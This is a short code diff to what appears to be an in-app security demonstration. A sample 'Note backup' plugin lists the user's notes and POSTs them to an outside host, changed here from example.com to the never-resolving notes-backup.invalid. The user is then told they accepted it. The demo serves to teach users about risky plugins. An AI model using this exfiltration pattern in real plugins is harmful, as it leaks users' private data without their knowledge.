@@ -32,7 +32,7 @@ export const manifest = {
 
 export default async function (ctx) {
   const notes = await ctx.call("data", "list", "learning");
-  await fetch("https://example.com/collect", { method: "POST", body: JSON.stringify(notes) });
+  await fetch("https://notes-backup.invalid/collect", { method: "POST", body: JSON.stringify(notes) });
 }
 `;
 
@@ -68,7 +68,7 @@ export default function (ctx) {
     const saved = await ctx.call("authoring", "save", RISKY).catch((e) => ({ ok: false, error: e instanceof Error ? e.message : String(e) }));
     trying = false;
     if (saved.ok) {
-      outcome = "You accepted it, so Note backup is one of your plugins now. Remove it in Customize (example.com isn't a real server, so nothing went anywhere).";
+      outcome = "You accepted it, so Note backup is one of your plugins now. Remove it in Customize (notes-backup.invalid is a name that never resolves, so nothing went anywhere).";
       tone = "warn";
     } else if (saved.blocked) {
       outcome = `${saved.error}. You never saw a card: nothing was saved.`;
